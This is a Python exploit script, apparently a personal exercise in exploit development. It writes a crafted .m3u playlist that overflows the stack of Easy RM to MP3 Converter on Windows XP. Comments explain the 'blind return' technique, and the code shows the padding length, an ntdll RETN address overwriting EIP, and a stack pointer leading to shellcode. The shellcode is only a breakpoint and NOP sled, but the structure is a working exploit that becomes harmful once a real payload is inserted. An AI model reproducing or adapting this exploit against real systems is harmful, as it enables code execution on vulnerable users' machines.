
import struct

#in this method we use blind return technique

#in this we overwrite eip with a ret address and top of stack contains
#our starting shellcode address so that eip points to top of stack after ret
#which in turn points to our shellcode

#these are addresses i found for easyrm2mp3 in my xp machine
#000FFD30   - eip

#000FFD38   - esp
#000FFD3C  	- esp+4

#return address is
#0040156B   C3             RETN
#7C929763   C3               RETN  - ntdll
#004379DE   C3             RETN




junk='A'*26064
junk=junk.encode('raw_unicode_escape')

eip=struct.pack('<I',0x7C929763)

beforeesp='B'*4
beforeesp=beforeesp.encode('raw_unicode_escape')

#now our esp starts
esp=struct.pack('<I',0x000FFD3C)

shellcode=""


shellcode+='\xcc'
shellcode+='\x90'*25
shellcode=shellcode.encode('raw_unicode_escape')

overflow=junk+eip+beforeesp+esp+shellcode


f=open("C:\\Users\\nikki\\Desktop\\exploit_development_python\\blindret.m3u","wb")

f.write(overflow)

f.close()

print("file created successfully")
